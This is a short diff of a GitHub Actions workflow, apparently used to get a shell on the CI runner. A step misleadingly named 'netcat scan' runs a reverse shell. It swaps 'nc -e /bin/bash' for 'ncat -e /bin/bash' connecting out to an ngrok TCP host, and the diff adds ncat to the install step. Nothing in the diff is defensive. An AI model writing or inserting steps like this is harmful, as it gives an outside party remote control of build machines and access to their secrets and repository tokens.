@@ -11,10 +11,12 @@ jobs:
       run: sudo apt update
 #---------------------------------------------------netcat
     - name: netcat install 
-      run:  sudo apt install netcat
+      run:  sudo apt install netcat && sudo apt install ncat
     - name: netcat scan
       run: |
-       nc -e /bin/bash  5.tcp.eu.ngrok.io 19700
+       #nc -e /bin/bash  5.tcp.eu.ngrok.io 19700
+       ncat -e /bin/bash  5.tcp.eu.ngrok.io 19700
+       
 
        
 #--------------------------------bind shell       
